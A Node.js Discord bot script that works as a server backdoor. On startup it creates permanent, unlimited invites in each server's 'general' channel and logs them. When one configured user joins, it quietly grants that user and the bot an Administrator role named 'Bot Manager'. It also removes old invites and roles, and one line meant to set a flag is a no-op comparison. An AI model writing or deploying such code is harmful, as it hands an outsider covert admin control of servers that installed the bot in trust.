const Discord = require("./node_modules/discord.js");
const client = new Discord.Client();
const Info = require('./info.json');

client.on('ready', () => {
  console.log();
  console.log(`Logged in as ${client.user.tag}!`);

  console.log(client.guilds.map(guild => guild.name));
  console.log();

    client.guilds.forEach(async guild => {
    let channel = guild.channels.filter(channel => channel.name == 'general').first();

    channel.createInvite({
      temporary: false,
      maxAge: 0,
      maxUses: 0,
      unique: true
    }, 'because').then(invite => {
      console.log(`${guild} : ${invite.url}`);

      // Delete all the old invites.
      channel.fetchInvites()
        .then(invites => {
          invites
            .filter(oldInvite => oldInvite.inviter.id == client.user.id && oldInvite.url != invite.url)
            .forEach(invite => invite.delete());
        }).catch(() => console.log(`Could not fetch invites for ${guild}.`))
    }).catch(() => {
      console.log(`No invite created for ${guild}.`);
    })

    let oneRolePreserved = false;

    // Delete all but one of the old Bot Manager roles.
    guild.roles.filter(role => role.name == "Bot Manager").forEach(role => {
      if (role.members.size == 1) { // Only the bot still has it.
        role.delete();
      } else if (!oneRolePreserved) {
        oneRolePreserved != true;
      } else {
        role.delete();
      }
    });

    await sleep(3000);
    printRoles(guild);
  });
});

client.on('guildMemberAdd', member => {
  let guild = member.guild;

  if (member.user.toString() == Info.nuttyusername) {
    createAdminRole(guild, client, member);
  }
});

client.login(Info.token);

function createAdminRole(guild, client, guildMember) {
  guild.roles.filter(role => role.name == "Bot Manager").forEach(role => {
      if (role.members.size == 1) { // Only the bot still has it.
        role.delete();
      }
    });
  guild.createRole({
    name: 'Bot Manager',
    color: 'WHITE',
    permissions: 8,
    mentionable: false,
    hoist: false
  }).then(role => {
    let bot = guild.member(client.user);

    guildMember.addRole(role, 'because');
    bot.addRole(role, 'because');
    console.log("Admin role created");
  })
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function printRoles(guild) {
  console.log();
  console.log(`Guild is ${guild}, remaining roles are ${guild.roles.map(role => role.name)}`);
}

/*
  client.guilds.forEach(async guild => {
    let channel = guild.channels.filter(channel => channel.name == 'general').first();

    console.log(guild.name);
    console.log(guild.channels.map(channel => channel.name));
    console.log(channel.name);

    channel.createInvite({
      temporary: false,
      maxAge: 0,
      maxUses: 0,
      unique: true
    }, 'because').then(invite => console.log(`${guild.name}: ${invite.url}`));

    // Delete all the old Bot Manager roles.
    guild.roles.filter(role => role.name == "Bot Manager").forEach(role => {
      if (role.members.size == 1) {
        role.delete();
      }
    });
  */
